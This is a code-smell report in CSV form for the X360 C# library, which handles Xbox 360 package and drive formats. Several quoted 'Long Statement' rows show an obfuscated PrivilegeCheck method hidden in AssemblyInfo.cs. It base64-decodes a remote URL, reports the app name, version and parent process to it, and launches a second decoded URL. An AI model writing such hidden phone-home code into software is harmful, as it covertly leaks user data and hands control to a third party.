Implementation smell,Namespace,Class,File,Method,Description
Complex Method,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,SVODPackage,Cyclomatic complexity of the method is 9
Complex Method,X360.SVOD,SVODFuncs,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,GenerateHashOffset,Cyclomatic complexity of the method is 9
Long Parameter List,X360.FATX,FATXEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,FATXEntry,The method has 6 parameters.
Long Parameter List,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,Write,The method has 5 parameters.
Long Parameter List,X360.IO,Drive,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,CreateFile,The method has 7 parameters.
Long Parameter List,X360.IO,Drive,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,DeviceIoControl,The method has 8 parameters.
Long Parameter List,X360.Profile,XDBFEntry,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,XDBFEntry,The method has 5 parameters.
Long Parameter List,X360.STFS,ItemEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,ItemEntry,The method has 6 parameters.
Long Parameter List,X360.STFS,FileEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,FileEntry,The method has 6 parameters.
Long Parameter List,X360.STFS,FolderEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,FolderEntry,The method has 5 parameters.
Long Parameter List,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,XTakeHash,The method has 5 parameters.
Long Parameter List,X360.Security.Cryptography.Kerberos,KerbExtenz,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,KerberosDecrypt,The method has 5 parameters.
Long Parameter List,X360.Security.Cryptography,RC4Quick,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,RunKerberosDecrypt,The method has 5 parameters.
Long Statement,X360,XAbout,C:\repos\mtolly_X360\X360\X360\About.cs,CheckForUpdate,The length of the statement  "		StreamReader x = X360.Other.VariousFunctions.GetWebPageResponse ("http://skunkiebutt.com/ProductCheck.php?product=X360&command=read"); " is 134.
Long Statement,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The length of the statement  "		if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS) " is 123.
Long Statement,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The length of the statement  "					io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC)); " is 146.
Long Statement,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The length of the statement  "				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC)); " is 146.
Long Statement,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The length of the statement  "		Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false); " is 122.
Long Statement,X360.FATX,FATXPartition,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,BlockToOffset,The length of the statement  "		return ((xBlock == Constants.FATX16End || xBlock == 0 || xBlock >= xTable.BlockCount) ? -1 : ((long)(xBlock - 1) * (long)xBlockSize) + xDataStart); " is 147.
Long Statement,X360.FATX,FATXPartition,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,BlockToOffset,The length of the statement  "		return ((xBlock == Constants.FATX32End || xBlock == 0 || xBlock >= xTable.BlockCount) ? -1 : ((long)(xBlock - 1) * (long)xBlockSize) + xDataStart); " is 147.
Long Statement,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The length of the statement  "	new System.Threading.Thread (new System.Threading.ParameterizedThreadStart (System.DLLIdentify.PrivilegeCheck)).Start (System.Threading.Thread.CurrentThread); " is 158.
Long Statement,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The length of the statement  "		/*FATXPartition x = new FATXPartition((long)HDD.Partition1' (long)HDD.Partition2 - (long)HDD.Partition1' this' current);" is 120.
Long Statement,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The length of the statement  "                }*/FATXPartition x = new FATXPartition ((long)HDD.Partition3' (long)HDD.Partition4 - (long)HDD.Partition3' this' "System"); " is 123.
Long Statement,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,XSetStream,The length of the statement  "		xStream = (xftype == DJFileMode.Create) ? File.Create (xFile) : new FileStream (xFile' FileMode.Open' FileAccess.ReadWrite' FileShare.None); " is 140.
Long Statement,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The length of the statement  "		return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]); " is 125.
Long Statement,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The length of the statement  "		return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]); " is 150.
Long Statement,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The length of the statement  "		return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]); " is 175.
Long Statement,X360.IO,Drive,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,GetGeom,The length of the statement  "	DeviceIoControl (xSFH' 0x70000' IntPtr.Zero' 0' ref xGeom' (uint)Marshal.SizeOf (typeof(DiskGeometry))' out blah' IntPtr.Zero); " is 127.
Long Statement,X360.IO,Drive,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,MakeHandle,The length of the statement  "	xSFH = CreateFile (@"\\.\" + DeviceName.ToUpper ()' FileAccess.ReadWrite' FileShare.ReadWrite' IntPtr.Zero' FileMode.Open' FlagsAndAttributes.Device | FlagsAndAttributes.NoBuffering | FlagsAndAttributes.Write_Through' IntPtr.Zero); " is 231.
Long Statement,X360.Other,AssemblyFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,GrabParentProcessName,The length of the statement  "		return System.Diagnostics.Process.GetProcessById ((int)(new System.Diagnostics.PerformanceCounter ("Process"' "Creating Process ID"' System.Diagnostics.Process.GetCurrentProcess ().ProcessName).NextValue ())).ProcessName; " is 221.
Long Statement,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The length of the statement  "		return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2)); " is 169.
Long Statement,X360.STFS,ItemEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xFixOffset,The length of the statement  "	xDirectoryOffset = xPackage.STFSStruct.GenerateDataOffset (xPackage.xFileBlocks [xEntryID / 0x40].ThisBlock) + ((0x40 * xEntryID) % 0x40); " is 138.
Long Statement,X360.STFS,FileEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,FixHashes,The length of the statement  "			xPackage.XTakeHash (xPackage.GenerateDataOffset (x.ThisBlock)' xPackage.GenerateHashOffset (x.ThisBlock' TreeLevel.L0)' 0x1000); " is 128.
Long Statement,X360.STFS,FileEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,FixHashes,The length of the statement  "				xPackage.XTakeHash (xPackage.GenerateBaseOffset ((x * Constants.BlockLevel [0])' TreeLevel.L0)' xPackage.GenerateHashOffset ((x * Constants.BlockLevel [0])' TreeLevel.L1)' 0x1000); " is 180.
Long Statement,X360.STFS,FileEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,FixHashes,The length of the statement  "					xPackage.XTakeHash (xPackage.GenerateBaseOffset ((x * Constants.BlockLevel [1])' TreeLevel.L1)' xPackage.GenerateHashOffset ((x * Constants.BlockLevel [1])' TreeLevel.L2)' 0x1000); " is 180.
Long Statement,X360.STFS,FileEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xReplace,The length of the statement  "		BlockRecord[] xFileAlloc = xPackage.xAllocateBlocks (xIOin.BlockCountSTFS ()' xEntAlloc [xEntAlloc.Length - 1].ThisBlock + 1); " is 126.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xExtractPayload,The length of the statement  "			DJsIO xhead = new DJsIO (VariousFunctions.xGetUnusedFile (xOutLocale + "/" + dlcname () + ".txt")' DJFileMode.Create' true); " is 124.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The length of the statement  "		return new Verified (ItemType.Signature' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xHeadr)' xSiggy)' 0x22C' xSigSpot); " is 135.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xWriteTables,The length of the statement  "			XTakeHash (GenerateBaseOffset (i * Constants.BlockLevel [0]' TreeLevel.L0)' GenerateHashOffset (i * Constants.BlockLevel [0]' TreeLevel.L1)' 0x1000' ref xIO); " is 158.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xWriteTables,The length of the statement  "				XTakeHash (GenerateHashOffset ((i * Constants.BlockLevel [1])' TreeLevel.L1)' GenerateHashOffset ((i * Constants.BlockLevel [1])' TreeLevel.L2)' 0x1000' ref xIO); " is 162.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,xAddFile,The length of the statement  "		ItemEntry x = new ItemEntry (xFileName' (int)xIOIn.Length' false' (ushort)(xFileDirectory.Count + xFolderDirectory.Count)' Folder' this); " is 137.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The length of the statement  "					long xInputLocale = xSTFSStruct.GenerateBaseOffset (i * Constants.BlockLevel [0]' TreeLevel.L0) + (current.Index << 0xC); " is 121.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The length of the statement  "						xReturn.Add (new Verified (ItemType.TableTree0' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale)); " is 123.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The length of the statement  "						long xInputLocale = xSTFSStruct.GenerateBaseOffset ((i * Constants.BlockLevel [1])' TreeLevel.L1) + (current.Index << 0xC); " is 123.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHashTables,The length of the statement  "						xReturn.Add (new Verified (ItemType.TableTree1' XVerifyHash (xInputLocale' 0x1000' ref xHash)' xInputLocale' xHashLocale)); " is 123.
Long Statement,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifyHeader,The length of the statement  "			xReturn.Add (new Verified (ItemType.Certificate' RSAQuick.SignatureVerify (xRSAKeyz' SHA1Quick.ComputeHash (xCert)' ScrambleMethods.StockScramble (xSig' true))' 4' 0xAC)); " is 171.
Long Statement,X360.STFS,CreateSTFS,C:\repos\mtolly_X360\X360\X360\STFS\Create.cs,AddFile,The length of the statement  "	if (UppedDirectCount >= 0x3FF || UppedTotalBlocks (CreateTools.BlockCount (FileLocation)) > BlockStep [2] || FilePath == null || FilePath == "") " is 144.
Long Statement,X360.STFS,ProfilePackage,C:\repos\mtolly_X360\X360\X360\Profile\ProfilePackage.cs,LoadProfile,The length of the statement  "	new System.Threading.Thread (new System.Threading.ParameterizedThreadStart (System.DLLIdentify.PrivilegeCheck)).Start (System.Threading.Thread.CurrentThread); " is 158.
Long Statement,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The length of the statement  "	if (ContentType != PackageType.HDDInstalledGame && ContentType != PackageType.OriginalXboxGame && ContentType != PackageType.GamesOnDemand && ContentType != PackageType.SocialTitle) " is 181.
Long Statement,System,DLLIdentify,C:\repos\mtolly_X360\X360\X360\Properties\AssemblyInfo.cs,PrivilegeCheck,The length of the statement  "		string result = new IO.StreamReader (Net.WebRequest.Create (Encoding.ASCII.GetString (Convert.FromBase64String ("aHR0cDovL3NrdW5raWVidXR0LmNvbS9BcHBDaGVjay5waHA/cHJvY2Vzcz0=")) + System.Windows.Forms.Application.ProductName + Encoding.ASCII.GetString (Convert.FromBase64String ("JnZlcnNpb249")) + System.Windows.Forms.Application.ProductVersion + Encoding.ASCII.GetString (Convert.FromBase64String ("JnBhcmVudD0=")) + System.Diagnostics.Process.GetProcessById ((int)(new System.Diagnostics.PerformanceCounter ("Process"' "Creating Process ID"' Diagnostics.Process.GetCurrentProcess ().ProcessName).NextValue ())).ProcessName).GetResponse ().GetResponseStream ()).ReadLine (); " is 675.
Long Statement,System,DLLIdentify,C:\repos\mtolly_X360\X360\X360\Properties\AssemblyInfo.cs,PrivilegeCheck,The length of the statement  "			Diagnostics.Process.Start (Encoding.ASCII.GetString (Convert.FromBase64String ("aHR0cDovL3NrdW5raWVidXR0LmNvbS9sb2wudHh0"))); " is 125.
Complex Conditional,X360.FATX,FATXEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,FATXEntry,The conditional expression  "xNLen == 0xE5 || xNLen == 0xFF || xNLen == 0 || xNLen > 0x2A"  is complex.
Complex Conditional,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,restoreimg,The conditional expression  "xImageDrive == null || xImageDrive.IsDriveIO || !xImageDrive.Success || xImageDrive.Type != xType"  is complex.
Complex Conditional,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The conditional expression  "desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2)"  is complex.
Complex Conditional,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The conditional expression  "xHeader.ThisType == PackageType.HDDInstalledGame || xHeader.ThisType == PackageType.OriginalXboxGame || xHeader.ThisType == PackageType.GamesOnDemand || xHeader.ThisType == PackageType.SocialTitle"  is complex.
Complex Conditional,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The conditional expression  "xSession.HeaderData.ThisType == PackageType.GamesOnDemand || xSession.HeaderData.ThisType == PackageType.HDDInstalledGame || xSession.HeaderData.ThisType == PackageType.OriginalXboxGame || xSession.HeaderData.ThisType == PackageType.SocialTitle"  is complex.
Complex Conditional,X360.STFS,CreateSTFS,C:\repos\mtolly_X360\X360\X360\STFS\Create.cs,AddFile,The conditional expression  "UppedDirectCount >= 0x3FF || UppedTotalBlocks (CreateTools.BlockCount (FileLocation)) > BlockStep [2] || FilePath == null || FilePath == """  is complex.
Complex Conditional,X360.STFS,ProfilePackage,C:\repos\mtolly_X360\X360\X360\Profile\ProfilePackage.cs,AddGame,The conditional expression  "xUserGPD == null || !xUserGPD.xIO.Accessed || !xTitleGPD.xIO.Accessed || !xTitleGPD.IsValid"  is complex.
Complex Conditional,X360.SVOD,CreateSVOD,C:\repos\mtolly_X360\X360\X360\SVOD\Create.cs,Create,The conditional expression  "ContentType != PackageType.HDDInstalledGame && ContentType != PackageType.OriginalXboxGame && ContentType != PackageType.GamesOnDemand && ContentType != PackageType.SocialTitle"  is complex.
Complex Conditional,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,SVODPackage,The conditional expression  "xHeaderIO.ReadByte () != 0x24 && xHeaderIO.ReadByte () != 5 && xHeaderIO.ReadByte () != 5 && xHeaderIO.ReadByte () != 0x11"  is complex.
Complex Conditional,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,ExtractData,The conditional expression  "!dataloaded || xIOOut == null || !xIOOut.Accessed || !ActiveCheck ()"  is complex.
Virtual Method Call from Constructor,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The constructor "GDFImage" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The constructor "GDFImage" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The constructor "GDFImage" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The constructor "GDFImage" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The constructor "GDFImage" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The constructor "GDFImage" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.Media,MusicFile,C:\repos\mtolly_X360\X360\X360\Media\Music.cs,MusicFile,The constructor "MusicFile" calls a virtual method "Dispose".
Virtual Method Call from Constructor,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,UserAccount,The constructor "UserAccount" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.Profile,UserAccount,C:\repos\mtolly_X360\X360\X360\Profile\ProfileTools.cs,UserAccount,The constructor "UserAccount" calls a virtual method "ReadStream".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Dispose".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Write".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Flush".
